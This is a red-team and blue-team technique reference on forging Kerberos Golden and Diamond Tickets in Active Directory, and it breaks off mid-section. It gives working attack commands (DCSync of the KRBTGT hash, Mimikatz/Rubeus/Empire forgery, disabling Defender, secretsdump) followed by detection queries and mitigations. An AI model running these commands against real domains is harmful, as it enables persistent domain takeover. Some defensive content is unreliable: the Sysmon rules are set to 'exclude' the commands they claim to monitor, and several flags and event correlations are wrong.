# [CA-KERB-012]: Golden Ticket SIDHistory Manipulation

## Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | CA-KERB-012 |
| **MITRE ATT&CK v18.1** | [T1558.001: Steal or Forge Kerberos Tickets - Golden Ticket](https://attack.mitre.org/techniques/T1558/001/) |
| **Tactic** | Credential Access |
| **Platforms** | Windows AD |
| **Severity** | Critical |
| **CVE** | CVE-2014-6324 (MS14-068, context); N/A (Golden Tickets not patchable) |
| **Technique Status** | ACTIVE (indefinitely; only mitigation is KRBTGT protection) |
| **Last Verified** | 2025-01-06 |
| **Affected Versions** | Server 2003-2025 (all versions, post-KRBTGT compromise) |
| **Patched In** | N/A - Architectural limitation; mitigated via KRBTGT password management |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

**Note:** Sections 6 (Atomic Red Team), 8 (Splunk Detection), and 12 (Microsoft Defender for Cloud) not included because: (1) No Atomic test exists for golden ticket creation (environmental variation required); (2) Golden ticket detection is KQL-based (Sentinel primary); (3) Defender for Cloud does not detect local golden ticket creation. All section numbers have been dynamically renumbered based on applicability.

---

## 2. EXECUTIVE SUMMARY

**Concept:** A Golden Ticket is a forged Kerberos Ticket-Granting Ticket (TGT) created using the KRBTGT account's NTLM hash. Once an attacker obtains the KRBTGT hash (typically through DCSync or NTDS.dit extraction after Domain Admin compromise), they can create a valid TGT for any user in the domain without interacting with the Key Distribution Center (KDC). The attacker then injects arbitrary group SIDs—particularly Domain Admins (RID 512), Enterprise Admins (RID 519), or other high-privilege groups—into the Privilege Attribute Certificate (PAC) embedded within the forged TGT. This allows the attacker to impersonate any domain user with any group membership for an extended period (default 10 years). Unlike Pass-the-Hash or Pass-the-Ticket attacks that require fresh credentials, Golden Tickets persist even after password changes, providing long-term persistence and unrestricted access to any domain resource. The technique is fundamentally undetectable without proper Kerberos event log monitoring and is considered the "holy grail" of Active Directory persistence.

**Attack Surface:** Kerberos TGT generation, KRBTGT account security, Privilege Attribute Certificate (PAC) structure, group membership encoding in Kerberos tickets.

**Business Impact:** **Complete and Persistent Domain Compromise.** An attacker with a golden ticket can access any resource in the domain indefinitely, impersonate any user, modify domain configuration, exfiltrate sensitive data, deploy ransomware, and maintain persistence across password changes and system restarts. Recovery requires resetting the KRBTGT password twice (invalidating all existing tickets) and rebuilding trust in the entire domain.

**Technical Context:** Golden Ticket creation is offline and instantaneous (seconds). No network communication with KDC is required. Detection depends entirely on log analysis of TGT requests (Event 4768) and service ticket requests (Event 4769) on domain controllers. Without proper audit logging and SIEM forwarding, the attack is completely invisible.

### Operational Risk

- **Execution Risk:** Low - Once KRBTGT hash is obtained, ticket creation is trivial (one Mimikatz command). Requires no special privileges on the compromised workstation.
- **Stealth:** High - No host-side artifacts; no DC communication for TGT creation. Only detected via DC Kerberos event logs.
- **Reversibility:** No - Golden Tickets remain valid until KRBTGT password is reset (twice). Cannot be revoked individually.

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | 5.2.3.2.1 | Kerberos authentication policy enforcement |
| **DISA STIG** | WN11-AU-000502 | Audit account logon events (Kerberos) |
| **CISA SCuBA** | AC-2 | Account and Access Management |
| **NIST 800-53** | AC-3, SC-7 | Access Enforcement; Boundary Protection |
| **GDPR** | Art. 32 | Security of processing - cryptographic controls |
| **DORA** | Art. 9 | Protection and prevention of ICT incidents |
| **NIS2** | Art. 21 | Cyber Risk Management Measures |
| **ISO 27001** | A.9.2.3, A.9.2.5 | Privileged Access Rights; Credential management |
| **ISO 27005** | Risk Scenario | "Compromise of Authentication Infrastructure" |

---

## 3. TECHNICAL PREREQUISITES

**Required Privileges:** 
- To **create** golden tickets: None (offline operation)
- To **obtain KRBTGT hash**: Domain Admin or Domain Controller compromise (via DCSync or NTDS.dit dump)

**Required Access:** 
- KRBTGT account NTLM hash or AES-256 key
- Domain name and Domain SID
- Any compromised system to execute Mimikatz/Rubeus

**Supported Versions:**
- **Windows:** Server 2003-2025 (all versions)
- **Kerberos:** All versions (RFC 4120 compliant)
- **Tools:** Mimikatz 2.0+, Rubeus 1.5+

**Tools Required:**
- [Mimikatz](https://github.com/gentilkiwi/mimikatz) (Version 2.2.0+) - Kerberos ticket forgery
- [Rubeus](https://github.com/GhostPack/Rubeus) (Version 1.5+) - Alternative ticket creation
- [Impacket](https://github.com/SecureAuthCorp/impacket) - Post-exploitation (secretsdump)
- **Optional:** Powermad, PowerView - Reconnaissance and account enumeration

---

## 4. ENVIRONMENTAL RECONNAISSANCE

### Reconnaissance Method 1: Identify KRBTGT Account and Domain SID

**Objective:** Gather prerequisites for golden ticket creation before executing attack.

**Command (PowerShell):**

```powershell
# Get Domain SID
$domainSID = (Get-ADDomain).DomainSID.Value
Write-Host "Domain SID: $domainSID"

# Get KRBTGT account info
$krbtgt = Get-ADUser -Identity "krbtgt" -Properties Name, Created, LastLogonDate
Write-Host "KRBTGT Account: $($krbtgt.Name)"
Write-Host "Created: $($krbtgt.Created)"
Write-Host "Last Logon: $($krbtgt.LastLogonDate)"

# Get domain name
$domainName = (Get-ADDomain).Name
Write-Host "Domain: $domainName"
```

**What to Look For:**
- Domain SID format: `S-1-5-21-[three 32-bit numbers]`
- KRBTGT created on domain creation date (should be first domain account)
- KRBTGT LastLogonDate should be recent (KDC is active)

**Command (Linux/Impacket):**

```bash
# Using Impacket lookupsid.py
python3 lookupsid.py domain/username:password@domain.controller -csv | grep -i krbtgt

# Output includes Domain SID in KRBTGT entry
```

**Version Note:** Windows Server 2016+ may restrict LDAP queries; use administrator credentials if access denied.

---

### Reconnaissance Method 2: Enumerate Domain Admins and Privileged Groups

**Objective:** Identify target users to impersonate once golden ticket is created.

**Command:**

```powershell
# List Domain Admins
Get-ADGroupMember -Identity "Domain Admins" | Select-Object Name, SamAccountName

# List Enterprise Admins (forest root only)
Get-ADGroupMember -Identity "Enterprise Admins" -ErrorAction SilentlyContinue | Select-Object Name, SamAccountName

# Get Group RIDs for custom forging
$daGroup = Get-ADGroup -Identity "Domain Admins"
Write-Host "Domain Admins RID: 512"
Write-Host "Enterprise Admins RID: 519"
Write-Host "Schema Admins RID: 518"
```

**What to Look For:**
- Active DA accounts with recent logon dates (current targets)
- Service accounts with privileged group membership
- Unused/deprecated admin accounts (low-visibility targets)

---

## 5. DETAILED EXECUTION METHODS

### METHOD 1: Mimikatz Golden Ticket Creation (Standard)

**Supported Versions:** All Windows versions (Server 2003-2025)

#### Step 1: Obtain KRBTGT NTLM Hash via DCSync

**Objective:** Dump KRBTGT hash from domain controller using Directory Replication Service (DRS).

**Prerequisites:** Domain Admin or CONTROL_ACCESS permissions on domain object

**Command (Windows with Mimikatz):**

```powershell
# Launch Mimikatz
.\mimikatz.exe

# Inside Mimikatz console:
lsadump::dcsync /domain:domain.local /user:krbtgt
```

**Expected Output:**
```
[DC] 'domain.local' will be the domain
[DC] 'DC01.domain.local' will be the DC server
[DC] 'krbtgt' will be the user account
[*] Using the RPC transport.

Object RID : 502
** SAM ACCOUNT **
  krbtgt  : Administrator
  User Principal Name : krbtgt@domain.local
  
** CREDENTIALS:
  Hash NTLM: d125e4f69c851529045ec95ca80fa37e
  Hash SHA1: xxxxx (if applicable)
```

**What This Means:**
- Hash NTLM line shows the KRBTGT account's NTLM hash (RC4 equivalent)
- This hash is used to create and sign forged TGTs
- Hash remains valid until KRBTGT password is reset

**OpSec & Evasion:**
- DCSync activity generates Event 4662 (directory replication) on DC
- Run from low-visibility account with DR permissions (not Administrator)
- Execute during high-activity periods to blend with legitimate replication
- Detection likelihood: **High** if audit logging enabled on DCs

**Troubleshooting:**
- **Error:** "RPC Server Unavailable"
  - **Cause:** DC port 135 (RPC) unreachable or firewall blocked
  - **Fix:** Verify network connectivity: `Test-NetConnection -ComputerName dc01.domain.local -Port 135`
  - **Alternative:** Run on DC itself with local admin

- **Error:** "Access Denied"
  - **Cause:** User lacks CONTROL_ACCESS (Replicating Directory Changes) permission
  - **Fix (Server 2012+):** Must be Domain Admin or have explicit DR permissions
  - **Workaround:** Use NTDS.dit dump instead (requires DA + DC access)

#### Step 2: Obtain Domain SID

**Objective:** Extract domain SID needed for golden ticket PAC structure.

**Command:**

```powershell
# Method 1: PowerShell (requires domain user access)
(Get-ADDomain).DomainSID.Value

# Method 2: Impacket (from compromised Linux system)
python3 -c "from impacket.ldap import ldapasn1
# Parse LDAP domain info"

# Output example: S-1-5-21-3737340914-2019594255-2413685307
```

**What This Means:**
- SID uniquely identifies the domain forest
- Last three 32-bit numbers are organization-specific
- Injected into PAC as SID authority for all forged group memberships

#### Step 3: Create Golden Ticket with Mimikatz

**Objective:** Forge a TGT for impersonating high-privilege account with admin group membership.

**Command (Interactive Mimikatz):**

```powershell
# Launch Mimikatz (run as any user, not necessarily admin)
.\mimikatz.exe

# Inside Mimikatz:
privilege::debug
token::elevate

# Create golden ticket for Administrator with Domain Admins membership
kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-3737340914-2019594255-2413685307 /krbtgt:d125e4f69c851529045ec95ca80fa37e /ticket:administrator.tck /ptt
```

**Parameter Breakdown:**
- `/user:Administrator` - Account to impersonate
- `/domain:domain.local` - FQDN of target domain
- `/sid:S-1-5-21-...` - Domain SID (without trailing RID)
- `/krbtgt:hash` - KRBTGT NTLM hash (obtained from DCSync)
- `/ticket:filename` - Save ticket to file for later use
- `/ptt` - **Pass-the-ticket**: Inject directly into current process

**Expected Output:**
```
User      : Administrator
Domain    : domain.local
SID       : S-1-5-21-3737340914-2019594255-2413685307
User ID   : 500
Groups ID : *513 512 520 518 519 (Domain Users, Domain Admins, Group Policy Creators, Schema Admins, Enterprise Admins)
Duration  : 10 years

Golden ticket generated and injected successfully.
```

**What This Means:**
- Ticket is valid for 10 years by default (or until KRBTGT password reset)
- Group IDs 512=DA, 519=EA, 520=GP Creators, 518=Schema Admins
- `/ptt` flag loads ticket into current Kerberos session immediately
- Subsequent commands (klist, dir \\dc01\c$, etc.) will use forged ticket

**OpSec & Evasion:**
- Create ticket **on compromised workstation**, not on DC
- Save to file instead of `/ptt` if immediate use risks detection
- Remove Mimikatz executable after use (file-based IOC)
- Disable Defender: `Set-MpPreference -DisableRealtimeMonitoring $true`
- Detection likelihood: **Medium-Low** if created offline, **High** if used immediately

**Advanced: Custom Group Membership**

```powershell
# Create ticket with ONLY specified groups (RID format)
kerberos::golden /user:user /domain:domain.local /sid:S-1-5-21-... /krbtgt:hash /groups:512,519,520 /ticket:custom.tck /ptt
```

**Groups RID Reference:**
- **513**: Domain Users (primary group, always included)
- **512**: Domain Admins (RID 512, highest domain privilege)
- **519**: Enterprise Admins (RID 519, forest-wide DA)
- **518**: Schema Admins (RID 518, schema modification rights)
- **520**: Group Policy Creators (RID 520, GPO modification)
- **555**: RAS and IAS Servers (RID 555, for targeting Exchange)

#### Step 4: Verify Ticket Injection and Use Golden Ticket

**Objective:** Confirm ticket is loaded in memory and can be used for privileged access.

**Command:**

```powershell
# List loaded Kerberos tickets
klist

# Expected output showing TGT for Administrator:
# Current LogonId is 0:0xXXXXX
# Cached Tickets: (1)
# [0]    Client: Administrator @ DOMAIN.LOCAL
#        Server: krbtgt/DOMAIN.LOCAL @ DOMAIN.LOCAL
#        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
#        Ticket Flags 0x60a10000 -> forwardable forwarded initial reserved-field renewable pre-authenticated ok-as-delegate
#        Start Time: 1/6/2026 8:45:00 (local)
#        End Time:   1/5/2036 8:45:00 (local)    [!!! 10 YEARS !!!]
#        Renew Time: 1/5/2036 8:45:00 (local)
#        Session Key Type: AES-256-CTS-HMAC-SHA1-96
#        Cache Flags: 0x2 -> DELEGATION

# Test privileged access (will succeed with golden ticket)
dir \\dc01\c$
```

**Expected Output (Successful):**
```
Directory of \\dc01\c$

01/06/2026  8:45 AM    <DIR>          Windows
01/06/2026  8:45 AM    <DIR>          Program Files
[success - access granted]
```

**Troubleshooting:**
- **Error:** "Access Denied" despite golden ticket
  - **Cause:** Kerberos ticket not loaded (use `/ppt` flag)
  - **Fix:** Restart Mimikatz with `/ppt` option
  - **Alternative:** Load from file: `kerberos::ptt C:\ticket.tck`

- **Error:** klist shows no tickets
  - **Cause:** Ticket injection failed (elevation required)
  - **Fix:** Run Mimikatz as Administrator (right-click → Run as administrator)
  - **Alternative:** Use UNC path directly: `klist purge && kerberos::ptt file.tck`

---

### METHOD 2: Rubeus Golden Ticket with Diamond Ticket (Stealthier Alternative)

**Supported Versions:** Server 2016+ (OPSEC advantage)

#### Step 1: Create Diamond Ticket (Request + Modify Legitimate TGT)

**Objective:** Create ticket with lower detection profile by modifying legitimate TGT instead of creating entirely synthetic ticket.

**Prerequisites:** KRBTGT hash, target user credentials, valid domain account

**Command:**

```powershell
.\Rubeus.exe diamond /tgtdeleg /user:Administrator /domain:domain.local /sid:S-1-5-21-... /krbtgt:d125e4f69c851529045ec95ca80fa37e /nowrap
```

**Parameter Breakdown:**
- `/diamond` - Diamond ticket mode (decrypt real TGT, modify, re-encrypt)
- `/tgtdeleg` - Request TGT delegation (requires non-admin user)
- `/user:Administrator` - Target user to impersonate
- `/domain:domain.local` - Domain FQDN
- `/sid:S-1-5-21-...` - Domain SID
- `/krbtgt:hash` - KRBTGT NTLM hash
- `/nowrap` - Output as unwrapped base64

**Expected Output:**
```
[*] Diamond Ticket for 'Administrator' generated successfully.
[*] Ticket is PTT'd into the logon session
[*] TGT Details:
    Client: Administrator
    Server: krbtgt/DOMAIN.LOCAL
    Validity: 10 hours (renewable)
```

**What This Means:**
- Diamond ticket has **shorter validity** (10 hours, not 10 years) = lower detection window
- Ticket appears to originate from legitimate TGT request → harder to distinguish from normal Kerberos
- Still provides full admin impersonation within validity window
- **Better OPSEC** than raw golden ticket for short-term objectives

**Versus Pure Golden Ticket:**
| Aspect | Golden Ticket | Diamond Ticket |
|--------|---------------|-----------------|
| **Validity Period** | 10 years | 10 hours (renewable) |
| **Creation Method** | Synthetic (no DC interaction) | Modified legitimate TGT |
| **Detectability** | Forged timestamp anomalies | Appears legitimate |
| **Persistence** | Long-term (years) | Short-term (hours) |
| **Use Case** | Persistence, offline | Active compromise, OPSEC |

---

### METHOD 3: PowerShell Empire Golden Ticket Module

**Supported Versions:** All (framework-agnostic)

#### Automated Golden Ticket Generation

**Objective:** Automate golden ticket creation within PowerShell Empire for ease of use.

**Command:**

```powershell
# In PowerShell Empire:
usemodule credentials/mimikatz/golden_ticket
set domain domain.local
set sid S-1-5-21-3737340914-2019594255-2413685307
set user Administrator
set groups 512,519,520,518
set krbtgt_hash d125e4f69c851529045ec95ca80fa37e
set ticket_file /tmp/admin.tck
execute
```

**Expected Output:**
```
[*] Executing Module Credentials/Mimikatz/Golden_Ticket
[*] Executing 'privilege::debug'
[+] Privilege debug successfully elevated
[*] Executing 'kerberos::golden'
[+] Golden Ticket generated: /tmp/admin.tck
[+] Ticket injected into current session
[*] Use klist to verify ticket load
```

**Advantages Over Manual Mimikatz:**
- No artifacts (no mimikatz.exe on disk)
- Integrated with Empire's post-exploitation framework
- Automatic OPSEC handling (cleanup, obfuscation)
- Can chain with other modules (lateral movement, persistence)

---

## 6. ATTACK SIMULATION & VERIFICATION

*Atomic Red Team test does not exist for golden ticket creation (architecture-specific, requires environmental setup). Verification is performed via Kerberos event log analysis.*

**Manual Verification (Proof of Exploitation):**

```powershell
# After ticket injection, verify access to restricted resources
klist  # Confirm ticket is loaded

# Attempt access to DC (should succeed with golden ticket)
cmd /c "net use \\dc01\ipc$ /user:domain\administrator *"
# Should NOT prompt for password if golden ticket is valid

# List DC admin shares
dir \\dc01\c$
type \\dc01\windows\system32\drivers\etc\hosts
```

**Forensic Validation:**

```powershell
# Export ticket to examine structure
.\mimikatz.exe "kerberos::export /output:base64" exit

# Decode and inspect PAC
python3 <<EOF
import base64
from impacket.krb5 import asn1
from impacket import helper

# Decode base64 ticket and parse PAC groups
ticket_data = base64.b64decode("ticket_base64_here")
# Examine: TGT has 10-year lifetime, PAC shows 512 (DA), etc.
EOF
```

---

## 7. TOOLS & COMMANDS REFERENCE

#### [Mimikatz](https://github.com/gentilkiwi/mimikatz)

**Version:** 2.2.0+  
**Minimum Version:** 2.0.0  
**Supported Platforms:** Windows (x86/x64)

**Key Commands:**

```powershell
# Golden Ticket creation
kerberos::golden /user:admin /domain:domain.local /sid:S-1-5-21-... /krbtgt:hash /ppt

# List loaded tickets
kerberos::list

# Inject ticket from file
kerberos::ppt C:\ticket.tck

# DCSync (obtain KRBTGT hash)
lsadump::dcsync /domain:domain.local /user:krbtgt
```

---

#### [Rubeus](https://github.com/GhostPack/Rubeus)

**Version:** 1.5+  
**Minimum Version:** 1.5.0  
**Supported Platforms:** Windows (.NET)

**Key Commands:**

```powershell
# Standard golden ticket
Rubeus.exe golden /user:admin /domain:domain.local /sid:S-1-5-21-... /krbtgt:hash /ppt

# Diamond ticket (stealthier)
Rubeus.exe diamond /user:admin /domain:domain.local /sid:S-1-5-21-... /krbtgt:hash

# List tickets
Rubeus.exe klist

# Purge all tickets
Rubeus.exe klist /purge
```

---

#### [Impacket secretsdump](https://github.com/SecureAuthCorp/impacket)

**Version:** 0.9.24+  
**Supported Platforms:** Linux/macOS/Windows

```bash
# Post-exploitation: dump domain credentials using golden ticket
export KRB5CCNAME=/tmp/golden.ccache
python3 secretsdump.py -k -no-pass domain.local/Administrator@dc.domain.local
```

---

## 8. MICROSOFT SENTINEL DETECTION

#### Detection Query 1: 4769 without Preceding 4768 (Golden Ticket Indicator)

**Rule Configuration:**
- **Required Table:** SecurityEvent
- **Event IDs:** 4768 (TGT Request), 4769 (Service Ticket Request)
- **Alert Severity:** Critical
- **Frequency:** Real-time
- **Applies To Versions:** All (Server 2003-2025)

**KQL Query:**

```kusto
let TgtRequests = SecurityEvent
| where EventID == 4768
| project TgtTime=TimeGenerated, Computer, TargetUserName, TargetLogonGuid, TicketEncryptionType
| where TimeGenerated >= ago(2h);

let ServiceTicketRequests = SecurityEvent
| where EventID == 4769
| project StsTime=TimeGenerated, Computer, TargetUserName, ServiceName, TicketEncryptionType
| where TimeGenerated >= ago(2h);

ServiceTicketRequests
| join kind=leftouter TgtRequests on Computer, TargetUserName
| where isempty(TgtTime) or (StsTime - TgtTime) > 10m
| where TargetUserName != "MACHINE$" and TargetUserName != "KRBTGT"
| project AlertTime=StsTime, Computer, TargetUserName, ServiceName, GoldenTicketIndicator="No TGT Request Found"
```

**What This Detects:**
- Service ticket request (4769) without corresponding TGT issuance (4768)
- Indicates offline-forged TGT (golden ticket) being used
- High fidelity (low false positives) when baseline established

**Manual Configuration Steps (Azure Portal):**

1. Navigate to **Azure Portal** → **Microsoft Sentinel** → **Analytics**
2. Click **+ Create** → **Scheduled query rule**
3. **General Tab:**
   - Name: `Golden Ticket Detection - 4769 Without 4768`
   - Severity: `Critical`
   - Tactics: `Credential Access, Persistence`
4. **Set rule logic Tab:**
   - Paste KQL query above
   - Run query every: `5 minutes`
   - Lookup data: `2 hours`
5. **Incident settings Tab:**
   - Enable **Create incidents**
   - Group related alerts: `By Computer, TargetUserName`
6. Click **Review + create**

---

#### Detection Query 2: Long-Lived TGT with 10-Year Validity

**KQL Query:**

```kusto
SecurityEvent
| where EventID == 4768  // TGT Requested
| extend TicketLifetime = extract("Lifetime: ([0-9]+) hours", 1, tostring(EventData))
| extend TicketExpiryDays = toint(TicketLifetime) / 24
| where TicketExpiryDays > 2920  // 10 years = ~2920 days
| project TimeGenerated, Computer, TargetUserName, TicketExpiryDays, TicketEncryptionType
| where TargetUserName !in ("MACHINE$", "KRBTGT", "SYSTEM")
```

**What This Detects:**
- TGT with validity exceeding normal (typically 10 hours)
- Golden tickets default to 10 years validity
- High indicator of forged ticket

**Alert Threshold:** Any occurrence of TGT > 2920 days validity

---

## 9. WINDOWS EVENT LOG MONITORING

**Event ID 4768** (**TGT Requested**):
- **Log Source:** Security (Domain Controller)
- **Trigger:** KDC issues TGT to user
- **Golden Ticket Indicators:**
  - Long ticket lifetime (> 10 hours)
  - Nonexistent user or computer account
  - Unusual encryption type downgrade
  - Same user requesting from multiple DCs simultaneously

**Event ID 4769** (**Service Ticket Requested**):
- **Log Source:** Security (Domain Controller)
- **Trigger:** Client requests service ticket
- **Golden Ticket Indicators:**
  - Privileged account (Administrator, KRBTGT) requesting service tickets
  - Unusual SPN targets (CIFS, LDAP on sensitive servers)
  - **Orphaned 4769**: No corresponding 4768 (highest signal)

**Event ID 4624** (**Logon Successful**):
- **Log Source:** Security (target server)
- **Trigger:** User logs on to system
- **Golden Ticket Indicators:**
  - Logon Type 3 (Network) without matching DC authentication
  - High-privilege account logon from unusual workstation
  - Multiple logons from same source in short timeframe

**Event ID 4672** (**Special Privileges Assigned**):
- **Log Source:** Security (target server)
- **Trigger:** User with administrative privileges authenticates
- **Golden Ticket Indicators:**
  - Correlate with Event 4624: High-privilege logon
  - Privilege list (Domain Admins, Enterprise Admins) in event

**Manual Configuration (Group Policy):**

1. Open **Group Policy Management Console** (gpmc.msc)
2. Navigate to **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **Advanced Audit Policy Configuration**
3. Expand **Account Logon**
4. Enable: **Audit Kerberos Authentication Service** (Success & Failure)
5. Expand **Logon/Logoff**
6. Enable: **Audit Logon** (Success & Failure)
7. Run `gpupdate /force` on all domain controllers

**Manual Configuration (PowerShell on DC):**

```powershell
auditpol /set /subcategory:"Kerberos Authentication Service" /success:enable /failure:enable
auditpol /set /subcategory:"Kerberos Service Ticket Operations" /success:enable /failure:enable
```

---

## 10. SYSMON DETECTION PATTERNS

**Minimum Sysmon Version:** 13.0+  
**Supported Platforms:** Windows Server 2016+

**Sysmon Config Snippet (Process Execution):**

```xml
<Sysmon schemaversion="4.22">
  <!-- Monitor Mimikatz execution -->
  <ProcessCreate onmatch="exclude">
    <CommandLine condition="contains">mimikatz</CommandLine>
    <CommandLine condition="contains">kerberos::golden</CommandLine>
  </ProcessCreate>
  
  <!-- Monitor Rubeus execution -->
  <ProcessCreate onmatch="exclude">
    <CommandLine condition="contains">Rubeus.exe golden</CommandLine>
  </ProcessCreate>
  
  <!-- Monitor lsadump::dcsync (KRBTGT extraction) -->
  <ProcessCreate onmatch="exclude">
    <CommandLine condition="contains">lsadump::dcsync</CommandLine>
  </ProcessCreate>
</Sysmon>
```

**Manual Configuration:**

1. Download Sysmon: https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon
2. Create config file `sysmon-config.xml` with XML above
3. Install:
   ```cmd
   sysmon64.exe -accepteula -i sysmon-config.xml
   ```
4. Verify:
   ```powershell
   Get-Service Sysmon64
   Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" -MaxEvents 10
   ```

---

## 11. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

**Mitigation 1: Protect KRBTGT Account with Enhanced Monitoring**

The KRBTGT account is the most critical asset in AD. Unauthorized access allows unlimited golden ticket creation.

**Manual Steps (ADUC):**

1. Open **Active Directory Users and Computers** (dsa.msc)
2. Navigate to **Users** folder
3. Right-click **krbtgt** → **Properties**
4. **Account Tab:**
   - Ensure **Account is disabled** (checkbox NOT checked - it should be)
   - Enable **Account is sensitive and cannot be delegated**
5. **Member Of Tab:**
   - krbtgt should have **NO group memberships** (besides Domain Users)
6. Click **Apply** → **OK**

**Manual Steps (PowerShell):**

```powershell
# Verify KRBTGT account properties
$krbtgt = Get-ADUser -Identity "krbtgt" -Properties AccountNotDelegated, ProtectedFromAccidentalDeletion

# krbtgt MUST have:
# - AccountNotDelegated = TRUE
# - ProtectedFromAccidentalDeletion = TRUE

Set-ADUser -Identity "krbtgt" -AccountNotDelegated $true
Set-ADObject -Identity (Get-ADUser -Identity "krbtgt").ObjectGUID -ProtectedFromAccidentalDeletion $true
```

**Expected Output (Secure Configuration):**
```
AccountNotDelegated : True
ProtectedFromAccidentalDeletion : True
```

---

**Mitigation 2: Enable KRBTGT Password Monitoring and Reset Schedule**

**Manual Steps (Group Policy):**

1. Open **Group Policy Management Editor** (gpmc.msc)
2. Edit **Default Domain Policy** (or custom policy)
3. Navigate to **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **Account Policies** → **Kerberos Policy**
4. Set: **Maximum lifetime for user ticket** = **10 hours** (default, enforce)
5. Set: **Maximum lifetime for service ticket** = **10 hours** (default, enforce)
6. Set: **Maximum clock skew** = **5 minutes** (detect forged tickets)
7. Run `gpupdate /force`

**Manual Steps (Reset KRBTGT Twice - Remediation Only):**

```powershell
# EMERGENCY ONLY: After golden ticket compromise detected
# This invalidates ALL Kerberos tickets in domain (risk of service outage)

# Reset KRBTGT password TWICE
Set-ADAccountPassword -Identity "krbtgt" -Reset -NewPassword (Read-Host -AsSecureString "New KRBTGT Password")
Start-Sleep -Seconds 30
Set-ADAccountPassword -Identity "krbtgt" -Reset -NewPassword (Read-Host -AsSecureString "Confirm new KRBTGT Password")

# Force replication to all DCs
repadmin /syncall /d /p /P

# Verify change replicated
repadmin /showrepl *  # Should show all DCs with same update time
```

**Timeline:**
- First reset: Invalidates golden tickets signed with old key
- Second reset: Ensures old key cannot be used if DC has delayed replication
- Wait 30 seconds minimum between resets

---

### Priority 2: HIGH

**Mitigation 3: Implement Privileged Access Workstations (PAWs)**

Restrict Domain Admin credential usage to isolated, hardened workstations.

**Manual Steps (Conceptual - Full PAW deployment is complex):**

1. **Dedicated Hardware:**
   - Create isolated workstations running Server 2022
   - Network segment via VLAN (separate from user network)
   - Restrict outbound access to production systems only

2. **Hardening:**
   - Disable USB, CD/DVD, cameras
   - Enable Windows Defender, Credential Guard
   - Apply CIS Benchmark hardening

3. **Credential Management:**
   - Use just-in-time (JIT) admin access
   - Rotate admin passwords every 30 days
   - Monitor all logons to sensitive accounts

---

**Mitigation 4: Enable Kerberos Armoring (FAST)**

Enhance Kerberos pre-authentication to prevent ticket forgery.

**Manual Steps (Group Policy):**

1. Open **Group Policy Management Editor**
2. Edit **Default Domain Policy**
3. Navigate to **Computer Configuration** → **Policies** → **Administrative Templates** → **System** → **Kerberos**
4. Set: **Support for Kerberos FAST (Flexible Authentication Secure Tunneling)** = **Enabled - RFC 6113**
5. Run `gpupdate /force`

**Registry Alternative:**

```powershell
# Enable FAST on all DCs
$RegPath = "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\Kerberos\Parameters"
Set-ItemProperty -Path $RegPath -Name "StrictKdcPacValidation" -Value 1
Set-ItemProperty -Path $RegPath -Name "KdcSupportedEncryptionTypes" -Value 0xFFFFFFFF
Restart-Service Kerberos -Force
```

---

**Mitigation 5: Monitor and Alert on DCSync Activities**

DCSync is the primary method to obtain KRBTGT hash. Monitor for unauthorized replication.

**Manual Steps (Audit Policy):**

1. Open **Group Policy Management Editor**
2. Edit **Default Domain Policy**
3. Navigate to **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **Advanced Audit Policy Configuration** → **DS Access**
4. Enable: **Audit Directory Service Replication** (Success & Failure)
5. Run `gpupdate /force`

**Manual Verification (PowerShell):**

```powershell
# Check for 4662 events (Directory Service Access - replication)
Get-WinEvent -FilterHashtable @{
  LogName = 'Security'
  ID = 4662
  StartTime = (Get-Date).AddHours(-24)
  Data = '*krbtgt*'
} | Select-Object TimeCreated, Message
```

---

### Priority 3: MEDIUM

**Mitigation 6: Implement Conditional Access Policies (Entra ID Hybrid)**

Block unusual authentication patterns via Conditional Access.

**Manual Steps (Azure Portal):**

1. Navigate to **Azure Portal** → **Entra ID** → **Security** → **Conditional Access**
2. Click **+ New policy**
3. Name: `Block Unusual Kerberos TGT Requests`
4. **Assignments:**
   - Users: **All users**
   - Cloud apps: **Office 365** (or all)
   - Conditions:
     - **Sign-in risk**: High
     - **Impossible travel**: Enabled
5. **Access controls:**
   - Grant: **Block access**
6. Enable: **On**
7. Click **Create**

---

## 12. DETECTION & INCIDENT RESPONSE

### Indicators of Compromise (IOCs)

**Files:**
- `mimikatz.exe`, `Rubeus.exe` in %temp%, %windir%, or unusual paths
- `*.tck`, `*.kirbi` files (Kerberos ticket exports)
- PowerShell history files containing "kerberos::golden", "lsadump::dcsync"

**Registry:**
- HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Kerberos\Parameters keys modified

**Network:**
- RPC traffic (port 135, 445) from workstation to DC (DCSync replication)
- Unusual Kerberos traffic patterns (port 88) from non-standard sources

**Event Log:**
- Event 4662 (Directory replication) from non-admin accounts
- Event 4768 without 4769 correlation (golden ticket in use)
- Events 4769 requesting services for privileged accounts (Administrator, KRBTGT)

### Forensic Artifacts

**Disk (Domain Controller):**
- `C:\Windows\System32\winevt\Logs\Security.evtx` (4768, 4769 events)
- `C:\Windows\System32\config\SYSTEM` (KRBTGT hash change log)

**Memory (Compromised Workstation):**
- lsass.exe process: Kerberos tickets (use taskmgr.exe → lsass → Dump)
- kernel32.dll: Mimikatz injected code fragments

**Cloud (Entra ID - Hybrid):**
- Sign-in logs showing unusual authentication patterns
- Directory sync replication logs (Azure AD Connect)

### Response Procedures

**Step 1: Immediate Containment**

```powershell
# Disable potentially compromised DA accounts
Disable-ADAccount -Identity "Administrator"

# Clear all Kerberos tickets (kills active sessions)
klist purge

# Force DCs to invalidate tickets by resetting KRBTGT twice
Set-ADAccountPassword -Identity "krbtgt" -Reset -NewPassword (Read-Host -Prompt "New password" -AsSecureString)
Start-Sleep -Seconds 30
Set-ADAccountPassword -Identity "krbtgt" -Reset -NewPassword (Read-Host -Prompt "Confirm new password" -AsSecureString)
```

**Step 2: Forensic Investigation**

```powershell
# Export Security event logs from all DCs
